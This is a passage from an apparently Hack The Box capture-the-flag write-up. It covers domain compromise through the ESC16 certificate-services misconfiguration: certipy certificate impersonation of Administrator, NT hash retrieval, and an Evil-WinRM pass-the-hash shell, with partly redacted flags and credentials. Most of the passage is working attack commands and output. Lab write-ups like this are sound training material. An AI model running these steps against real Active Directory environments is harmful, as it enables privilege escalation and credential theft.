HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\fries-DC01-CA\PolicyModules\CertificateAuthority_MicrosoftDefauleExtensionList:

  DisableExtensionList REG_SZ = 1.3.6.1.4.1.311.25.2
CertUtil: -getreg command completed successfully.
```

DisableExtensionList REG_SZ = 1.3.6.1.4.1.311.25.2 ---> This line verifies ESC16 is now enabled.

Restart the service.

```bash
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> Restart-Service -Name CertSvc -Force
```





Now, we can request for the administrator certificate.



```bash
certipy-ad req -u 'svc_infra@fries.htb' -p m6...0d -ca fries-DC01-CA -template User -subject "CN=Administrator,CN=Users,DC=fries,DC=htb" -upn administrator@fries.htb -sid 'S-1-5-21-858338346-3861030516-3975240472-500' -dc-ip 10.129.4.161 -dcom
Certipy v5.0.4 - by Oliver Lyak (ly4k)


[*] Requesting certificate via DCOM
[*] Request ID is 45
[*] Successfully requested certificate
[*] Got certificate with subject: DC=htb,DC=fries,CN=Users,CN=svc_infra
[*] Got certificate with UPN 'administrator@fries.htb'
[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Synchronize the time with the target system time. Set ntp to false.

```bash
sudo ntpdate -u 10.129.4.161
2026-02-24 22:14:38.492006 (+0545) +25202.511924 +/- 0.133527 10.129.4.161 s1 no-leap
CLOCK: time stepped by 25202.511924
```

With the certificate, request the administrator hash.

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.4.161                                                                             
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@fries.htb'
[*]     SAN URL SID: 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Using principal: 'administrator@fries.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a7.....48
```

New credentials ---> Administrator:a7.....48


```bash
evil-winrm -i 10.129.4.161 -u Administrator -H a7.....48
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fries\administrator
```

Final flag.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
0e.....42
```

User flag is also available, of missed before.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type user.txt
63.....50
```
